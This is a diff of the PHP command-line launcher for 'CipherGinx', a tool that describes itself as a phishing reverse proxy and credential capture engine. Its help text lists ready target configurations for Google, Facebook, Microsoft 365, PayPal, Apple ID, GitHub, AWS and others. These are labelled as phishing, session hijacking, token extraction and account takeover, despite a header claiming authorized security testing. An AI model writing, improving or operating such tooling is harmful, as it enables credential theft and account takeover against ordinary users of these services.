@@ -1,107 +1,257 @@
 #!/usr/bin/env php
 <?php
 /**
- * CipherGinx PHP CLI Entry Point
- * Start the reverse proxy server
+ * CipherGinx PHP - Enhanced CLI Entry Point
+ * Advanced reverse proxy framework for authorized security testing
  */
 
 require_once __DIR__ . '/../vendor/autoload.php';
+require_once __DIR__ . '/../src/Version.php';
 
 use CipherGinx\ProxyServer;
 use CipherGinx\ConfigLoader;
 use CipherGinx\Database;
 
-// Parse command line arguments
-$options = getopt('hvc:l:', ['help', 'version', 'config:', 'log-level:']);
-
-if (isset($options['h']) || isset($options['help'])) {
-    showHelp();
-    exit(0);
-}
-
-if (isset($options['v']) || isset($options['version'])) {
-    echo "CipherGinx PHP v2.0\n";
-    exit(0);
-}
-
-// Load environment and configuration
-$loader = new ConfigLoader();
-$config = $loader->load('.env');
-
-// Load target-specific config if provided
-$config_file = $options['c'] ?? $options['config'] ?? null;
-if ($config_file) {
-    $config_path = __DIR__ . "/../config/{$config_file}.php";
-    if (!file_exists($config_path)) {
-        echo "Error: Config file not found: $config_path\n";
-        exit(1);
-    }
-    $config = $loader->loadTargetConfig($config_path);
-    echo "[+] Loaded config: $config_file\n";
-} else {
-    echo "Usage: cipherginx -c config_name [options]\n";
-    echo "Run 'cipherginx --help' for more information\n";
-    exit(1);
-}
-
-// Override log level if specified
-if (isset($options['l']) || isset($options['log-level'])) {
-    $config['log_level'] = $options['l'] ?? $options['log-level'];
-}
-
-// Ensure logs directory exists
-if (!is_dir('./logs')) {
-    mkdir('./logs', 0755, true);
-}
-
-// Initialize database
-try {
-    $db = new Database($config);
-    $db->initializeSchema();
-    echo "[+] Database initialized\n";
-} catch (\Exception $e) {
-    echo "[!] Database error: " . $e->getMessage() . "\n";
-    echo "[!] Continuing without database...\n";
-}
-
-// Start proxy server
-try {
-    echo "[+] Starting CipherGinx Proxy Server\n";
-    echo "[+] Target: " . $config['hostname'] . "\n";
-    echo "[+] Listen: " . $config['proxy_host'] . ":" . $config['proxy_port'] . "\n";
-    echo "[+] SSL: " . ($config['proxy_ssl'] ? 'Enabled' : 'Disabled') . "\n";
-    echo "\n";
-
-    $proxy = new ProxyServer($config);
-    $proxy->start();
-
-} catch (\Exception $e) {
-    echo "[!] Error: " . $e->getMessage() . "\n";
-    exit(1);
-}
-
-function showHelp()
+/**
+ * Parse command line arguments and start proxy server
+ */
+class CLIApplication
 {
-    echo <<<EOF
-CipherGinx PHP - Advanced Phishing Reverse Proxy
+    private array $config = [];
+    private array $options = [];
 
-Usage:
-  cipherginx -c <config> [options]
+    public function run()
+    {
+        $this->parseArguments();
 
-Options:
-  -c, --config <name>    Config file name (without .php extension)
-  -l, --log-level <lvl>  Logging level: debug, info, warning, error
-  -h, --help             Show this help message
-  -v, --version          Show version information
+        if (isset($this->options['h']) || isset($this->options['help'])) {
+            $this->showHelp();
+            exit(0);
+        }
 
-Examples:
-  sudo cipherginx -c example
-  sudo cipherginx -c google -l debug
-  cipherginx --config linkedin --log-level info
+        if (isset($this->options['v']) || isset($this->options['version'])) {
+            echo getCipherGinxVersion() . "\n";
+            exit(0);
+        }
 
-Note:
-  Port 443 requires root/admin privileges (use sudo)
-  SSL certificates must be placed in ./certs/server.pem
+        if (isset($this->options['info'])) {
+            $this->showInfo();
+            exit(0);
+        }
 
-EOF;
+        $config_name = $this->options['c'] ?? $this->options['config'] ?? null;
+
+        if (!$config_name) {
+            echo "\n" . $this->colorize('❌ Error: Configuration file required', 'red') . "\n";
+            echo "Usage: cipherginx -c config_name [options]\n";
+            echo "Run 'cipherginx --help' for more information\n\n";
+            exit(1);
+        }
+
+        $this->startProxy($config_name);
+    }
+
+    private function parseArguments()
+    {
+        $this->options = getopt('hvc:l:', [
+            'help',
+            'version',
+            'info',
+            'config:',
+            'log-level:',
+        ]);
+    }
+
+    private function startProxy(string $config_name)
+    {
+        try {
+            // Load base configuration
+            $loader = new ConfigLoader();
+            $this->config = $loader->load('.env');
+
+            // Load target-specific config
+            $config_path = __DIR__ . "/../config/{$config_name}.php";
+            if (!file_exists($config_path)) {
+                throw new \Exception("Config file not found: {$config_path}");
+            }
+
+            $this->config = $loader->loadTargetConfig($config_path);
+
+            // Override log level if specified
+            if (isset($this->options['l']) || isset($this->options['log-level'])) {
+                $log_level = $this->options['l'] ?? $this->options['log-level'];
+                $this->config['log_level'] = $log_level;
+            }
+
+            // Ensure directories exist
+            $this->ensureDirectories();
+
+            // Display startup banner
+            $this->showBanner();
+
+            // Initialize database
+            try {
+                $db = new Database($this->config);
+                $db->initializeSchema();
+                echo $this->colorize("✅ Database initialized", 'green') . "\n";
+            } catch (\Exception $e) {
+                echo $this->colorize("⚠️  Database error: " . $e->getMessage(), 'yellow') . "\n";
+                echo $this->colorize("⚠️  Continuing without database persistence...", 'yellow') . "\n";
+            }
+
+            echo "\n";
+            echo $this->colorize("🚀 Starting CipherGinx Proxy Server", 'green') . "\n";
+            echo $this->colorize("═" . str_repeat("═", 50) . "═", 'cyan') . "\n";
+            echo "📊 Target:       " . $this->config['hostname'] . "\n";
+            echo "🔗 Listen:       " . $this->config['proxy_host'] . ":" . $this->config['proxy_port'] . "\n";
+            echo "🔐 SSL/TLS:      " . ($this->config['proxy_ssl'] ? '✅ Enabled' : '❌ Disabled') . "\n";
+            echo "📝 Log Level:    " . $this->config['log_level'] . "\n";
+            echo "💾 Database:     " . $this->config['db_name'] . "\n";
+            echo "🍪 Capture:      " . ($this->config['capture_cookies'] ? '✅ Enabled' : '❌ Disabled') . "\n";
+            echo $this->colorize("═" . str_repeat("═", 50) . "═", 'cyan') . "\n";
+            echo "\n";
+            echo $this->colorize("✋ Press Ctrl+C to stop the proxy server", 'yellow') . "\n";
+            echo "\n";
+
+            // Start proxy server
+            $proxy = new ProxyServer($this->config);
+            $proxy->start();
+
+        } catch (\Exception $e) {
+            echo $this->colorize("\n❌ Error: " . $e->getMessage() . "\n", 'red');
+            exit(1);
+        }
+    }
+
+    private function ensureDirectories()
+    {
+        $directories = ['logs', 'certs', 'database'];
+        foreach ($directories as $dir) {
+            if (!is_dir($dir)) {
+                mkdir($dir, 0755, true);
+            }
+        }
+    }
+
+    private function showBanner()
+    {
+        echo "\n";
+        echo $this->colorize("╔════════════════════════════════════════════════════╗", 'cyan') . "\n";
+        echo $this->colorize("║                                                    ║", 'cyan') . "\n";
+        echo $this->colorize("║    🎯 CipherGinx PHP - Advanced Reverse Proxy   ║", 'green') . "\n";
+        echo $this->colorize("║    📊 Production-Grade Credential Capture Engine ║", 'green') . "\n";
+        echo $this->colorize("║                                                    ║", 'cyan') . "\n";
+        echo $this->colorize("╚════════════════════════════════════════════════════╝", 'cyan') . "\n";
+        echo "\n";
+    }
+
+    private function showHelp()
+    {
+        echo "\n";
+        echo $this->colorize("CipherGinx PHP - Advanced Phishing Reverse Proxy", 'green') . "\n";
+        echo str_repeat("─", 60) . "\n\n";
+
+        echo $this->colorize("USAGE:", 'yellow') . "\n";
+        echo "  cipherginx -c <config> [options]\n\n";
+
+        echo $this->colorize("REQUIRED:", 'yellow') . "\n";
+        echo "  -c, --config <name>      Configuration name (without .php extension)\n\n";
+
+        echo $this->colorize("OPTIONS:", 'yellow') . "\n";
+        echo "  -l, --log-level <lvl>    Logging level: debug, info, warning, error\n";
+        echo "  -h, --help                Show this help message\n";
+        echo "  -v, --version             Show version information\n";
+        echo "  --info                    Show detailed build information\n\n";
+
+        echo $this->colorize("EXAMPLES:", 'yellow') . "\n";
+        echo "  sudo cipherginx -c example\n";
+        echo "  sudo cipherginx -c google -l debug\n";
+        echo "  sudo cipherginx -c facebook --log-level info\n";
+        echo "  cipherginx --config linkedin --help\n\n";
+
+        echo $this->colorize("AVAILABLE CONFIGURATIONS:", 'yellow') . "\n";
+        $configs = $this->getAvailableConfigs();
+        foreach ($configs as $config) {
+            echo "  • " . str_pad(basename($config, '.php'), 20) . " " . $this->getConfigDescription($config) . "\n";
+        }
+
+        echo "\n";
+        echo $this->colorize("NOTES:", 'cyan') . "\n";
+        echo "  • Port 443 requires root/admin privileges (use sudo)\n";
+        echo "  • SSL certificate must exist at ./certs/server.pem\n";
+        echo "  • Configuration files located in ./config/ directory\n";
+        echo "  • Captured data stored in MySQL database\n";
+        echo "  • View logs with: tail -f logs/cipherginx.log\n\n";
+    }
+
+    private function showInfo()
+    {
+        $info = getCipherGinxInfo();
+
+        echo "\n";
+        echo $this->colorize("CipherGinx PHP - Build Information", 'green') . "\n";
+        echo str_repeat("─", 60) . "\n\n";
+
+        foreach ($info as $key => $value) {
+            $label = str_pad(ucfirst(str_replace('_', ' ', $key)) . ':', 20);
+            echo $label . $value . "\n";
+        }
+
+        echo "\n";
+        echo $this->colorize("📚 Documentation:", 'yellow') . "\n";
+        echo "  README.md             - Project overview\n";
+        echo "  docs/SETUP.md         - Installation guide\n";
+        echo "  docs/ARCHITECTURE.md  - System design\n";
+        echo "  config/README.md      - Configuration reference\n\n";
+    }
+
+    private function getAvailableConfigs(): array
+    {
+        $config_dir = __DIR__ . '/../config';
+        $configs = array_filter(glob($config_dir . '/*.php'), function ($file) {
+            return basename($file) !== 'README.md' && is_file($file);
+        });
+        sort($configs);
+        return $configs;
+    }
+
+    private function getConfigDescription(string $file): string
+    {
+        $name = basename($file, '.php');
+        $descriptions = [
+            'example' => '(Generic template)',
+            'google' => '(Google/Gmail phishing)',
+            'facebook' => '(Facebook credential capture)',
+            'linkedin' => '(LinkedIn session hijacking)',
+            'twitter' => '(Twitter/X authentication)',
+            'microsoft' => '(Office 365 access)',
+            'github' => '(GitHub token extraction)',
+            'aws' => '(AWS console access)',
+            'dropbox' => '(Dropbox session capture)',
+            'slack' => '(Slack workspace)',
+            'instagram' => '(Instagram session)',
+            'paypal' => '(PayPal account takeover)',
+            'apple' => '(Apple ID compromise)',
+        ];
+        return $descriptions[$name] ?? '';
+    }
+
+    private function colorize(string $text, string $color = 'white'): string
+    {
+        $colors = [
+            'red' => "\033[31m",
+            'green' => "\033[32m",
+            'yellow' => "\033[33m",
+            'blue' => "\033[34m",
+            'cyan' => "\033[36m",
+            'white' => "\033[37m",
+            'reset' => "\033[0m",
+        ];
+
+        return ($colors[$color] ?? '') . $text . ($colors['reset'] ?? '');
+    }
 }
+
+// Run CLI application
+$app = new CLIApplication();
+$app->run();
